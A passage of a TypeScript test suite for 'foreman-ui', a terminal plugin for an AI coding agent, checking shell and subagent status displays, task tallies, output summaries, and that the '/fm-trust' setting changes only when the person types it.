  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /waiting on 2 background shells/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /cargo test --workspace/ })).toBeDefined()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /▍Background shells/ })).toBeDefined()
  await pane.unmount()
  const text = '<task-notification><task-id>bx1</task-id><status>completed</status></task-notification>'
  await $.prompt.submit({ text, origin: { kind: 'task-notification' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /waiting on 1 background shell\b/ })).toBeDefined()
  await $.tool.call({ tool: 'TaskStop', task_id: 'bx2' })
  expect(await ui.find({ type: 'Text', text: /waiting on/ })).toBeUndefined()
  await ui.unmount()
})

test('each running subagent gets a mini Claude of its own color beside the mascot', async ($, on) => {
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/src/parse.py', agentId: 'ag1' } // the engine stamps agentId
  await $.tool.call(inSubagent)
  expect((await pane.findAll({ type: 'Text', text: /▐▛█▜▌/ })).length).toBe(1)
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't9', reason: 'answer', agentId: 'ag1' })
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  await pane.unmount()
})

test('a killed subagent sends no turn.complete; the engine list retires its mini Claude', async ($, on) => {
  const { clock, agentStatus } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/a.py', agentId: 'ag2' }
  await $.tool.call(inSubagent)
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect((await pane.findAll({ type: 'Text', text: /▐▛█▜▌/ })).length).toBe(1)
  agentStatus.now = 'killed'
  await clock.advance(2000)
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  await pane.unmount()
})

test('sizes carry this project history: usually ~N beside the chip, time on task, what a gate run costs', async ($, on) => {
  const active = { ...VIEW.active!, on_task_s: 720 }
  world(on, [{ ...CALM, active, typical: { 'FIX/M': 25, 'CLEAN/S': 8 } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /12m 00s on it · usually ~25m/ })).toBeDefined()
  await ui.unmount()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: '~8m' })).toBeDefined() // T-0008 CLEAN small in the queue
  expect(await pane.find({ type: 'Text', text: /a full run ≈ 2m 37s/ })).toBeDefined() // 140.2 + 5.8 + 11.0 s
  await pane.unmount()
})

test('the band tallies what closed since the person last wrote, until they write again', async ($, on) => {
  // the queue ran dry: the band would hide, but the tally is the news the person comes back for
  const closed: FmView = { ...CALM, active: null, queue: [], inbox: [], inbox_total: 0, closed: [{ id: 'T-0007', status: 'done' }] }
  world(on, [CALM, closed])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't1', reason: 'answer' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /since your last message: 1 done · T-0007/ })).toBeDefined()
  await $.prompt.submit({ text: '<task-notification>…</task-notification>', origin: { kind: 'task-notification' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /since your last message/ })).toBeDefined() // not the person
  await $.prompt.submit({ text: 'thanks', origin: { kind: 'composer' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /since your last message/ })).toBeUndefined()
  await ui.unmount()
})

test('a subagent the engine no longer lists leaves; a quiet one shows how long and can be stopped', async ($, on) => {
  // T-0121: one stale entry read as a subagent 'running for almost 10 hours'
  const { clock, agentStatus, tools } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/a.py', agentId: 'ag2' }
  await $.tool.call(inSubagent)
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await clock.advance(11 * 60 * 1000)
  expect(await pane.find({ type: 'Text', text: /quiet 11m/ })).toBeDefined()
  await pane.press({ key: 'stop-ag2' })
  expect(tools).toContain('TaskStop ag2')
  agentStatus.listed = false // gone from the engine's list (ended while nobody was told)
  await clock.advance(2000)
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  expect(await pane.find({ key: 'stop-ag2' })).toBeUndefined()
  await pane.unmount()
})

test('/fm-trust works only when the person types it; it writes the trust record itself; the band warns', async ($, on) => {
  // T-0120: no tool call may write Foreman state and fm has no "on": the typed command is the only way in
  const { calls } = world(on, [{ ...CALM, mode: { ...CALM.mode!, trust: true }, trust_file: '/h/foreman/state/trust.json' }])
  const written: { path: string; text: string }[] = []
  on('fs.write', async ($, e) => {
    written.push({ path: e.path, text: e.text })
    return { value: undefined }
  })
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const presentation = { isFullscreen: false, columns: 120 }
  const refused = await $.command.run({ command: 'fm-trust', args: 'on', origin: { kind: 'scheduled-trigger' }, presentation })
  expect(refused.text).toMatch(/only when you type it/)
  expect(written).toEqual([])
  await $.command.run({ command: 'fm-trust', args: 'on', origin: { kind: 'composer' }, presentation })
  expect(written.map(w => w.path)).toEqual(['/h/foreman/state/trust.json'])
  expect(JSON.parse(written[0]!.text)).toMatchObject({ on: true, via: 'composer' })
  expect(calls.some(c => c[1] === 'trust' && c.length === 2)).toBe(true) // fm trust: records it in the ledger
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /trust on: Claude may edit the guard and Claude Code settings/ })).toBeDefined()
  await ui.unmount()
  await $.command.run({ command: 'fm-trust', args: 'off', origin: { kind: 'composer' }, presentation })
  expect(calls.at(-2)).toEqual(['fm', 'trust', 'off'])
})

test('the look: coloured words not highlighted blocks, quiet controls, the human next, a narrow band that never wraps', async ($, on) => {
  // T-0122, from the live render: chips were background blocks, buttons [ boxed ], the pane showed the agent's own
  // instruction, and beside a docked pane the band wrapped letter by letter
  const next = 'T-0007 step 2/2: raise the timeout — do it, verify, then fm task step T-0007 done 2 --evidence "<cmd>" (procedure: x.md)'
  world(on, [{ ...VIEW, next }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const wide = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  for (const ui of [wide, pane]) {
    const drawn = JSON.stringify(await ui.drawn())
    expect(drawn).not.toContain('backgroundColor')
    expect(drawn).not.toContain('do it, verify')
    expect(drawn).toContain('raise the timeout')
    for (const b of await ui.findAll({ type: 'Button' })) expect(JSON.stringify(b)).toContain('"plain":true')
  }
  await wide.unmount()
  await pane.unmount()
  const narrow = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band(), props: { ...band().props, bodyColumns: 40 } })
  expect(await narrow.find({ type: 'Text', text: 'FIX' })).toBeDefined()
  expect(await narrow.find({ type: 'Text', text: 'today' })).toBeUndefined() // the side details drop, nothing wraps
  expect(await narrow.find({ type: 'Text', text: 'context' })).toBeUndefined()
  await narrow.unmount()
})

test('kit: a command output, short: failures first, else the tail, each line toned', () => {
  // T-0123: a summary instead of the raw output panel
  expect(tone('FAILED (failures=2)')).toBe('err')
  expect(tone('0 failed, 12 passed')).toBe('ok')
  expect(tone('warning: unused import')).toBe('warn')
  expect(tone('compiling foo')).toBe('plain')
  const long = Array.from({ length: 40 }, (_, i) => `line ${i}`).join('\n')
  const tail = outputSummary(long, '')
  expect(tail.total).toBe(40)
  expect(tail.lines.map(l => l.text)).toEqual(['line 34', 'line 35', 'line 36', 'line 37', 'line 38', 'line 39'])
  expect(tail.more).toBe(34)
  const bad = outputSummary(`${long}\nerror: boom at x.rs:3\n\u001b[31mFAILED\u001b[0m`, 'warning: y')
  expect(bad.lines.map(l => l.text)).toEqual(['error: boom at x.rs:3', 'FAILED']) // colours stripped
  expect(bad.failures).toBe(true)
})

test('a finished shell command is a summary with its key lines; the pane keeps the whole output, formatted', async ($, on) => {
  const { answer } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const stdout = Array.from({ length: 30 }, (_, i) => `test ${i} ... ok`).join('\n') + '\nRan 30 tests\nOK'
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolResult', requestId: 'b1',
    props: { tool_use_id: 'b1', tool: 'Bash', output: { stdout, stderr: '', interrupted: false }, isErrored: false } })
  expect(await row.find({ type: 'Text', text: /32 lines/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /Ran 30 tests/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /… 26 more/ })).toBeDefined()
  await row.unmount()
  const failed = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolResult', requestId: 'b2',
    props: { tool_use_id: 'b2', tool: 'Bash', output: { stdout: 'x', stderr: 'boom' }, isErrored: true } })
  expect(await failed.find({ type: 'Text', text: 'engine' })).toBeDefined() // an error keeps Claude Code's full text
  await failed.unmount()
  answer.result = { stdout, stderr: '', interrupted: false }
  await $.tool.call({ tool: 'Bash', command: 'python3 -m unittest' })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /▍Output/ })).toBeDefined()
  expect(await pane.find({ type: 'Text', text: /\$ python3 -m unittest/ })).toBeDefined()
  expect(await pane.find({ type: 'Text', text: /test 29 \.\.\. ok/ })).toBeDefined()
  await pane.unmount()
})
